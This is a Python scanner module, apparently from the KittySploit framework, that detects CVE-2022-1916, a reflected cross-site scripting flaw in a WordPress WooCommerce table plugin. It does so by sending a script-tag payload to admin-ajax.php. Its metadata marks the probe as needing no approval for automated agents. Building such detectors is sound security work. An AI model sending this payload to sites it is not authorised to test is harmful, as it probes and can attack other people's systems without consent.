#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Active Products Tables for WooCommerce plugin prior to 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Active Products Tables for WooCommerce <1.0.5 - Cross-Site Scripting Detection',
        'description': 'WordPress Active Products Tables for WooCommerce plugin prior to 1.0.5 contains a cross-site scripting vulnerability.. The plugin does not sanitize and escape a parameter before outputting it back in the response of an AJAX action, An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wordpress', 'wp-plugin', 'xss', 'wpscan', 'wp', 'pluginus', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/d16a0c3d-4318-4ecd-9e65-fc4165af8808',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1916',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/cyllective/CVEs',
        ],
        'cve': 'CVE-2022-1916',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=woot_get_smth&what={%22call_action%22:%22x%22,%22more_data%22:%22\\u003cscript%3Ealert(document.domain)\\u003c/script%3E%22}', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(document.domain)</script>', 'woot-content-in-popup', 'woot-system', 'woot-table',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Active Products Tables for WooCommerce <1.0.5 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=woot_get_smth&what={%22call_action%22:%22x%22,%22more_data%22:%22\\u003cscript%3Ealert(document.domain)\\u003c/script%3E%22}',
            )
            return True
        return False

